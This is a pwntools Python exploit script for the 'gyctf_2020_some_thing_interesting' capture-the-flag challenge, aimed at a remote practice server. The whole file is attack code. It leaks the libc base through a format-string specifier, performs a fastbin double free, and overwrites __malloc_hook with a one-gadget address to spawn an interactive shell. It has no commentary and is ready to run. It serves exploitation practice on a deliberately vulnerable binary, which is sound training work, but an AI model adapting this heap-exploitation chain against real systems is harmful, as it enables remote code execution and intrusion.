from pwn import *

#context.log_level = 'debug'

#p = process('./gyctf_2020_some_thing_interesting')
p = remote('node4.buuoj.cn', 27284)
elf = ELF('gyctf_2020_some_thing_interesting')
libc = ELF('libc-2.23.buu.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + '\n' + s)

def checkIsAdmin():
    p.sendlineafter(b'to do :', b'0')

def alloc(Osize, Ocontent, REsize, REcontent):
    p.sendlineafter(b'to do :', b'1')
    p.sendlineafter(b'> O\'s length : ', str(Osize).encode())
    p.sendafter(b'> O : ', Ocontent)
    p.sendlineafter(b'> RE\'s length : ', str(REsize).encode())
    p.sendafter(b'> RE : ', REcontent)

def edit(index, Ocontent, REcontent):
    index += 1
    p.sendlineafter(b'to do :', b'2')
    p.sendlineafter(b'> Oreo ID : ', str(index).encode())
    p.sendafter(b'> O : ', Ocontent)
    p.sendafter(b'> RE : ', REcontent)

def delete(index):
    index += 1
    p.sendlineafter(b'to do :', b'3')
    p.sendlineafter(b'> Oreo ID : ', str(index).encode())

def show(index):
    index += 1
    p.sendlineafter(b'to do :', b'4')
    p.sendlineafter(b'> Oreo ID : ', str(index).encode())


p.sendlineafter(b'code please:', b'OreOOrereOOreO%17$p')
checkIsAdmin()

p.recvuntil(b'OreOOrereOOreO')

libc_base = int(p.recv(14), 16) - libc.sym['__libc_start_main'] - 240
malloc_hook = libc_base + libc.sym['__malloc_hook']

success('libc_base -> {}'.format(hex(libc_base)))
success('malloc_hook -> {}'.format(hex(malloc_hook)))

alloc(0x60, b'a', 0x50, b'a') #0
alloc(0x60, b'a', 0x50, b'a') #1
delete(0)

one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
one_gadgets_buu = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

#one = one_gadgets[3] + libc_base
one = one_gadgets_buu[3] + libc_base

delete(1)
delete(0)

alloc(0x60, p64(malloc_hook - 0x23), 0x60, p64(malloc_hook - 0x23))
alloc(0x60, b'a', 0x60, b'a' * 0x13 + p64(one))

p.sendlineafter(b'to do :', b'1')
p.sendlineafter(b'> O\'s length : ', b'1')

p.interactive()